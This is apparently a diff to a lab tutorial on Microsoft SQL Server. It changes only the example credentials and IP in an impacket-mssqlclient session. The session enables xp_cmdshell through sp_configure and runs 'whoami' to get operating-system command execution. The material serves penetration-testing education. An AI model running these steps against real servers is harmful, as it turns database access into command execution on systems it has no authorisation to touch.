@@ -40,7 +40,7 @@ impacket-mssqlclient <username>:<password>@<hostname> -windows-auth
 Example:
 
 ```bash
-impacket-mssqlclient Administrator:Lab123@192.168.212.18 -windows-auth
+impacket-mssqlclient Malek:pass18113@192.168.212.182 -windows-auth
 ```
 
 ```plaintext
@@ -54,21 +54,21 @@ Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 [*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
 [*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
 [!] Press help for extra shell commands
-SQL (SQLPLAYGROUND\Administrator  dbo@master)> dir
+SQL (SQLPLAYGROUND\Malek  dbo@master)> dir
 ERROR: Line 1: Could not find stored procedure 'dir'.
-SQL (SQLPLAYGROUND\Administrator  dbo@master)> EXECUTE sp_configure 'show advanced options', 1;
+SQL (SQLPLAYGROUND\Malek  dbo@master)> EXECUTE sp_configure 'show advanced options', 1;
 [*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
-SQL (SQLPLAYGROUND\Administrator  dbo@master)> RECONFIGURE;
-SQL (SQLPLAYGROUND\Administrator  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1;
+SQL (SQLPLAYGROUND\Malek  dbo@master)> RECONFIGURE;
+SQL (SQLPLAYGROUND\Malek  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1;
 [*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
-SQL (SQLPLAYGROUND\Administrator  dbo@master)> RECONFIGURE;
-SQL (SQLPLAYGROUND\Administrator  dbo@master)> EXECUTE xp_cmdshell 'whoami';
+SQL (SQLPLAYGROUND\Malek  dbo@master)> RECONFIGURE;
+SQL (SQLPLAYGROUND\Malek  dbo@master)> EXECUTE xp_cmdshell 'whoami';
 output                        
 ---------------------------   
 nt service\mssql$sqlexpress   
 
 NULL                          
-SQL (SQLPLAYGROUND\Administrator  dbo@master)>
+SQL (SQLPLAYGROUND\Malek  dbo@master)>
 ```
 
 ## Enabling Advanced Options
